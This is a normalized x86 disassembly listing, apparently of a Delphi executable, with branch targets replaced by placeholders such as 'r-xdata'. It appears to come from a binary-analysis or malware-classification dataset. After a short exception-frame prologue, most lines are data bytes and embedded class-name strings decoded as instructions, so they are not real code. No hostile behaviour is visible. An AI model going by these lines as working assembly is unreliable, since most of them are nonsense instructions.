push ebp
mov ebp esp
xor eax eax
push ebp
push sub_443482
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443489
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_443344
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405874
mov edx eax
mov eax [ rw-data ]
call sub_42a3a8
sub_44348d
xor al 0x44
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
and [ eax + 0x44 ] 0x0
or edx [ esp + eax * 2 + 0x72 ]
popad
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add [ eax + 0x40004460 ] al
popad
inc esp
add al dh
pushad
inc esp
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
nop
lodsb [ esi ]
xor al 0x44
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add [ eax + 0x35 ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
add ah bh
inc esp
jb r-xdata
add [ ebx + 0x44360cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
inc esp
inc esp
add al dl
pushad
inc esp
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx + 0x44 ] ch
add [ eax + 0x44 ] bl
add [ eax + 0x60 ] bl
inc esp
add [ edi + ebx * 2 + 0x44 ] bl
add [ ecx ] dl
inc esp
add [ eax ] ah
pop edi
inc esp
add [ eax + 0x44 ] dh
add [ eax + 0x60 ] bh
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 4 + 0x35 ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebp * 2 + 0x35 ] si
inc esp
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi + 0x340044 ] cl
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add al ah
pushad
inc esp
add al dl
pushad
inc esp
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
jb r-xdata
inc esp
add [ eax + 0x5c004461 ] bh
pop edi
inc esp
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
shl [ 0x34c00044 ] 0x40
add al ah
pushad
inc esp
add al dl
add [ eax ] al
cld
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
les esi [ esp + eax * 2 ]
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add al al
xor al 0x44
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc esp
add ah ah
arpl [ eax + eax + 0x58 ] ax
pushad
inc esp
add [ edi + ebx * 2 + 0x44 ] bl
add [ edx + 0x5f200044 ] bl
inc esp
add [ eax + 0x44 ] dh
inc ebx
outsd
outsb
je r-xdata
inc esp
add ah ah
popad
inc esp
add [ eax + 0x61 ] al
inc esp
add al dh
pushad
inc esp
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
pushad
add [ ecx ] dl
inc esp
add [ eax ] ah
pop edi
inc esp
add ah al
popad
inc esp
add [ eax + 0x60 ] bh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x5c ] si
aaa
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40004437 ] cl
add [ eax ] al
add [ esi + esi + 0x34c00044 ] al
inc eax
add al ah
pushad
inc esp
add [ edx ] al
inc esp
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx + 0x44 ] ch
add [ eax - 0x47ffbb9f ] ah
popad
inc esp
add [ edi + ebx * 2 + 0x44 ] bl
pushad
inc esp
add ah dl
xor al 0x40
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x54 ] si
inc esp
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc esp
add al al
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edi + 0x38 ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 8 + 0x37 ] si
inc esp
add [ eax + 0x36 ] dl
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x60 ] bh
inc esp
add [ eax - 0x7ffbba0 ] al
bound eax [ eax + eax + 0x8 ]
bound eax [ eax + eax + 0x40 ]
arpl [ eax + eax - 0x44 ] ax
arpl [ eax + eax - 0x30 ] ax
arpl [ eax + eax - 0x10 ] ax
arpl [ eax + eax + 0xf ] ax
push esp
inc esp
jb r-xdata
pushad
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
in al dx
aaa
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
cmp [ eax + eax + 0x70 ] al
add [ eax ] al
add al al
xor eax 0x34c00044
inc eax
add al ah
pushad
inc esp
add al dl
pushad
inc esp
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
insb
bound eax [ eax + eax + 0x6c ]
popad
add [ eax - 0x47ffbb9f ] ah
popad
inc esp
add [ edi + ebx * 2 + 0x44 ] bl
enter 0x4034 0x0
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x6c004032 ] al
popad
inc esp
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] bl
pop edi
inc esp
add [ eax + 0x44 ] bl
add [ eax + 0x60 ] bl
inc esp
add [ edi + ebx * 2 + 0x44 ] bl
add al al
pop esi
inc esp
add [ eax ] ah
pop edi
outsd
insd
inc ecx
add [ ecx + ecx * 4 ] cl
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
dec esp
cmp [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] bh
add [ eax - 0x7ffbba0 ] al
bound eax [ eax + eax + 0x8 ]
bound eax [ eax + eax + 0x40 ]
arpl [ eax + eax - 0x44 ] ax
arpl [ eax + eax - 0x30 ] ax
arpl [ eax + eax - 0x10 ] ax
arpl [ eax + eax + 0x11 ] ax
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx + 0x44 ] ch
inc ebx
outsd
outsb
je r-xdata
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
xor al 0x40
add al ah
pushad
inc esp
add al bh
arpl [ eax + eax - 0x2c ] ax
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
insb
bound eax [ eax + eax + 0x6c ]
popad
inc esp
add ah ah
arpl [ eax + eax + 0x58 ] ax
pushad
inc esp
add [ edi + ebx * 2 + 0x44 ] bl
add [ edx + 0x5f200044 ] bl
inc esp
add [ eax + 0x44 ] dh
add [ eax + 0x60 ] bh
inc esp
add [ ebx + 0x4438b0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
cmp [ eax + eax + 0x70 ] al
add [ eax ] al
add [ eax - 0x3fffbbc9 ] ah
add [ ecx ] dl
inc esp
add [ eax ] ah
pop edi
inc esp
add ah al
popad
inc esp
add [ eax + 0x60 ] bh
inc esp
add [ eax + 0x5c004461 ] bh
pop edi
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx + 0x36 ] si
inc esp
add [ eax + 0x4435 ] bl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax + eax ] bh
add [ eax ] al
sbb al 0x35
inc esp
add al al
xor al 0x40
add al ah
pushad
inc esp
add [ eax + 0x60 ] bh
inc esp
add [ eax + 0xb004460 ] al
push esp
inc esp
jb r-xdata
inc esp
inc esp
add [ eax + 0x44 ] dh
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
cmovb eax [ eax ]
add al 0x7b
inc esp
add [ eax ] ch
cmovb eax [ eax ]
mov esp 0x1000420f
adc [ edx ] al
inc esp
jns r-xdata
inc edx
add [ eax ] bh
js r-xdata
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc esp
add ah ah
popad
inc esp
add [ eax + 0x61 ] al
inc esp
add al dh
pushad
inc esp
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add al al
jpe r-xdata
add ah al
push eax
inc ebp
add [ eax - 0x13ffbb87 ] bh
push eax
inc ebp
add [ eax ] al
push ecx
inc ebp
add [ eax ] dh
jpo r-xdata
add [ eax + 0x51 ] bh
inc ebp
add [ eax - 0x7fffbb86 ] al
push ecx
inc ebp
add [ eax - 0x77ffbb86 ] ah
push ecx
inc ebp
add [ ebx + edi * 2 + 0x7b940044 ] dh
inc esp
add ah dl
jpo r-xdata
add [ edi + ecx + 0x7a580042 ] ah
add al dl
jae r-xdata
add [ ebp + 0x36d00040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ecx + edx * 2 + 0x51a00045 ] bl
inc ebp
add ah ah
jpe r-xdata
add [ edx ] dl
push esp
inc ebx
add ah ch
jns r-xdata
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
js r-xdata
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
add [ eax + edi * 2 + 0x44 ] dl
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x443a8090
add [ ebx ] al
outsd
outsb
je r-xdata
add [ ecx + edx * 2 ] bh
inc ebp
add [ eax + 0x51 ] dl
inc ebp
add [ edx + edi * 2 ] ah
inc esp
add [ edx + edi + 0x64080044 ] bh
insd
dec ebp
popad
outsb
jne r-xdata
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
inc esp
inc ecx
add [ eax ] dl
dec edx
inc edx
add ah bh
dec ecx
inc edx
add ah dh
jne r-xdata
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
or al 0x89
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x44 ] ah
add [ eax + eax ] ah
add al cl
and al 0x42
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
enter 0x4475 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3a ] ch
inc esp
add [ eax + eax ] bl
add [ eax ] al
fmul [ ecx + 0x45 ]
add al al
xor al 0x40
add ah cl
xor al 0x40
inc esp
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
add [ ebx + edi + 0x44 ] al
add [ esi ] al
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
lea eax [ eax ]
dec eax
cmp eax [ eax + eax + 0x3 ]
insb
inc esp
add al bl
inc edx
add [ eax + 0x7a ] bl
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
or al 0x54
cmp al [ eax + eax + 0x3 ]
cmp al [ eax + eax + 0x3 ]
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
jo r-xdata
jae r-xdata
inc ebx
outsd
imul ebp [ edi + 0x6e ] 0x3ba4c08b
inc esp
add [ eax + 0x74614454 ] al
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
aam 0x34
inc eax
outsd
insb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al bh
cmp al [ eax + eax + 0xb ]
jae r-xdata
jl r-xdata
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
add [ esi ] al
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + edi + 0x44 ] bh
xor al 0x40
add ah dl
xor al 0x40
add al cl
cmp [ eax + eax + 0x34 ] eax
and eax 0x40042
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add [ ebx + edi + 0x61060044 ] ch
add [ gs : eax + 0x300443b ] esi
or edx [ ecx + eax * 2 + 0x6e ]
outsb
mov eax eax
movsb [ edi ] [ esi ]
cmp eax [ eax + eax + 0x4 ]
add eax 0x74614454
or [ ebx + 0x6f ] al
outsb
je r-xdata
push esp
inc ecx
outsb
inc ecx
add [ eax + 0x77 ] dl
inc esp
push esp
popad
arpl [ eax + 0x6f ] bp
jb r-xdata
inc eax
add al bh
cmp eax [ eax + eax + 0x6 ]
or [ ecx + eax * 2 + 0x6e ] dl
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
cmp eax [ eax + eax + 0x6 ]
jb r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
bound ecx [ edi + 0x72 ]
jb r-xdata
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
dec ebp
outsd
jne r-xdata
push esp
sar ah 0x3a
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
cmp eax [ eax + eax + 0x6 ]
popad
push es
inc edx
add [ ecx + edi * 2 + 0x44 ] al
outsd
insb
jae r-xdata
cwde
ja r-xdata
inc ebx
outsd
outsb
jae r-xdata
add al bh
mov [ ecx ] eax
or al 0x89
inc ecx
add [ eax + edi * 2 ] ah
inc esp
add [ edi + esi * 2 ] dl
inc esp
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add ecx [ ebx ]
push esp
inc ecx
outsb
outsd
insb
jae r-xdata
ja r-xdata
outsb
jae r-xdata
add [ ebx + edi + 0xc900044 ] ebp
cmp al 0x44
add [ ecx ] al
andps xmm0 [ ebx + 0x6f ]
dec ebp
popad
add [ ecx ] ecx
push esp
inc ebp
outsb
je r-xdata
add [ ebp + 0x39ec0040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
cwde
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
popad
js r-xdata
jb r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
loopne r-xdata
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add [ ecx ] al
add [ eax ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax + 0x3b ] cl
inc esp
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
cwde
ja r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
jb r-xdata
jb r-xdata
outsd
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
pop esp
cmp eax 0xb080044
push esp
dec ebp
outsd
imul ebp [ esi + 0x74 ] r-xdata
mov al [ 0x700443c ]
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
inc esp
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
or edx [ ebp + ecx * 2 + 0x6f ]
add [ ecx ] al
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
or [ esp + eax * 2 ] bh
add [ eax + eax ] dl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x443c0874
jb r-xdata
jae r-xdata
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
[ eax + 0x1004477 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax ] cl
cmp al 0x44
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x443dd4c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
ja r-xdata
cmp al 0x44
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
add [ eax ] dl
add [ eax ] al
[ eax + 0x1004477 ]
cmp al 0x44
outsb
je r-xdata
imul ebp [ esi + 0x74 ] 0x443c7473
add [ ebx * 2 + 0x40041 ] bl
or [ ebx + 0x6f ] al
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
add [ ecx ] al
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x443c0874
imul esp [ gs : edi + 0x68 ] 0x443c0874
add [ eax + eax ] cl
add bh bh
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
dec esp
popad
push 0x90004010
push ebp
inc ecx
add [ eax + r-xdata ] dl
jb r-xdata
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
push esp
dec ebx
jns r-xdata
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ eax - 0x6fffbeab ] dl
test [ esi ] bh
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add al 0x11
inc eax
add [ eax + 0x3c004155 ] dl
adc [ eax ] al
cmp al 0x10
inc eax
add [ ebp + 0x3e380040 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add al bh
cmp al [ eax + eax ]
adc [ eax ] al
nop
dec eax
aas
inc esp
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
jb r-xdata
add al 0x11
inc eax
add [ eax - 0xfffbbcb ] bl
aas
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ ebx ] eax
outsb
je r-xdata
add al 0x11
inc eax
add [ edx + edi + 0x44 ] bh
add [ eax + 0x3c004155 ] dl
adc [ eax ] al
cmp al 0x10
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
sar [ esi ] 0x44
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x3ec00040 ] cl
inc esp
push ebx
add ecx [ eax ]
push es
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
cwde
xor eax 0x3ff00044
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
inc ebp
outsb
jb r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add [ eax ] bh
cmp [ eax + eax + 0x3c ] al
adc [ eax ] al
cmp al 0x10
inc eax
add [ ebp + 0x40b40040 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + eax * 2 + 0x44 ] cl
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x3fa80040 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
